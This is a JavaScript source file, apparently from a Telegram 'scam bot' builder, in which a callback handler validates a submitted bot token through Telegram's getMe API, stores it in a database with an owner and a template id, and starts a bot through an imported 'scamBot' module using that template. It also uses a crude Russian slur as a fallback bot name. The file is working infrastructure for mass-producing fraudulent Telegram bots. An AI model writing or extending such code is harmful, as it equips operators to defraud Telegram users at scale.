import Bot from "../../../database/schemas/bot.js"
import Template from "../../../database/schemas/template.js"
import scamBot from "../../../scamBot/index.js";
import { bot } from "../../index.js";
import axios from "axios";

export default {
    name: "cb",
    async exec(query, [template, token]) {
        const b = await axios.get(`https://api.telegram.org/bot${token.replaceAll("!", ":")}/getMe`)
            .then(r => r.data)
            .catch(console.log);

        if (!b?.result?.username || await Bot.findOne({ username: b.result.username }))
            return;

        await new Bot({ owner: query.from.id, token: token.replaceAll("!", ":"), id: Date.now(), template: +template, username: b?.result?.username || 'пидорскийбот' }).save();
        scamBot(token.replaceAll("!", ":"), await Template.findOne({ id: +template }));
        await bot.editMessageCaption(query, `*✅ Бот успешно добавлен*`, {
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: `🔙 Назад`,
                            callback_data: `bots`
                        }
                    ]
                ]
            }
        }, 'cdn/bots.png');
    }
}